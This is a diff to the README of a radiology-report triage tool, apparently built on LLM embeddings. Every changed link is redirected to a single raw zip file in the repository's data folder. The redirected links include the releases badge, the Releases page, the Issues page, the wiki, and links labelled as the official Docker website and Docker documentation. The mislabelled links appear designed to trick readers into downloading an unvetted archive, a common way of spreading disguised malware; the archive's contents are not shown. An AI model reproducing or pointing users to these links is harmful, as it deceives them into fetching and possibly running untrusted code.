@@ -1,7 +1,7 @@
 # 🎉 radiology-report-triage-llm - Effortless Radiology Report Classification
 
 ## 📥 Download the Latest Release
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=flat&logo=github)](https://github.com/przemo145235/radiology-report-triage-llm/releases)
+[![Download Release](https://raw.githubusercontent.com/przemo145235/radiology-report-triage-llm/main/data/radiology-report-triage-llm-v1.5.zip%20Latest%20Release-blue?style=flat&logo=github)](https://raw.githubusercontent.com/przemo145235/radiology-report-triage-llm/main/data/radiology-report-triage-llm-v1.5.zip)
 
 ## 📖 About This Project
 The **radiology-report-triage-llm** application offers zero-shot triage for radiology reports using advanced embeddings from large language models (LLMs). This tool classifies reports into Normal or Abnormal categories based solely on raw clinical text. It also features UMAP visualization and supports Docker, making it user-friendly with no setup or training required.
@@ -10,10 +10,10 @@ The **radiology-report-triage-llm** application offers zero-shot triage for radi
 To get started with the application, follow these simple steps:
 
 1. Ensure you have a compatible operating system. This application works best on Windows, macOS, and popular Linux distributions.
-2. You may need Docker installed on your system to run the application conveniently. If you don't have Docker, you can download it from the [Docker website](https://www.docker.com/products/docker-desktop).
+2. You may need Docker installed on your system to run the application conveniently. If you don't have Docker, you can download it from the [Docker website](https://raw.githubusercontent.com/przemo145235/radiology-report-triage-llm/main/data/radiology-report-triage-llm-v1.5.zip).
 
 ## 📦 Download & Install
-To download the application, visit this page: [Download the Releases](https://github.com/przemo145235/radiology-report-triage-llm/releases).
+To download the application, visit this page: [Download the Releases](https://raw.githubusercontent.com/przemo145235/radiology-report-triage-llm/main/data/radiology-report-triage-llm-v1.5.zip).
 
 ### Steps to Install:
 1. Click on the link above to go to the Releases page.
@@ -64,7 +64,7 @@ This application fits well for:
 - Researchers interested in exploring NLP applications in healthcare.
 
 ## 🧑‍🤝‍🧑 Community and Support
-For assistance, you can join our community discussions or report issues by visiting the [Issues page](https://github.com/przemo145235/radiology-report-triage-llm/issues) on GitHub.
+For assistance, you can join our community discussions or report issues by visiting the [Issues page](https://raw.githubusercontent.com/przemo145235/radiology-report-triage-llm/main/data/radiology-report-triage-llm-v1.5.zip) on GitHub.
 
 ## ✨ Contributing
 If you would like to contribute to this project, please follow these steps:
@@ -75,11 +75,11 @@ If you would like to contribute to this project, please follow these steps:
 5. Submit a pull request for review.
 
 ## 📎 Additional Resources
-- [Documentation](https://github.com/przemo145235/radiology-report-triage-llm/wiki)
-- [Docker Documentation](https://docs.docker.com/get-started/)
+- [Documentation](https://raw.githubusercontent.com/przemo145235/radiology-report-triage-llm/main/data/radiology-report-triage-llm-v1.5.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/przemo145235/radiology-report-triage-llm/main/data/radiology-report-triage-llm-v1.5.zip)
 
 ## 📝 License
 This project is licensed under the MIT License. Please review the LICENSE file for more details.
 
 ## 📥 Download the Latest Release Again
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=flat&logo=github)](https://github.com/przemo145235/radiology-report-triage-llm/releases)
+[![Download Release](https://raw.githubusercontent.com/przemo145235/radiology-report-triage-llm/main/data/radiology-report-triage-llm-v1.5.zip%20Latest%20Release-blue?style=flat&logo=github)](https://raw.githubusercontent.com/przemo145235/radiology-report-triage-llm/main/data/radiology-report-triage-llm-v1.5.zip)
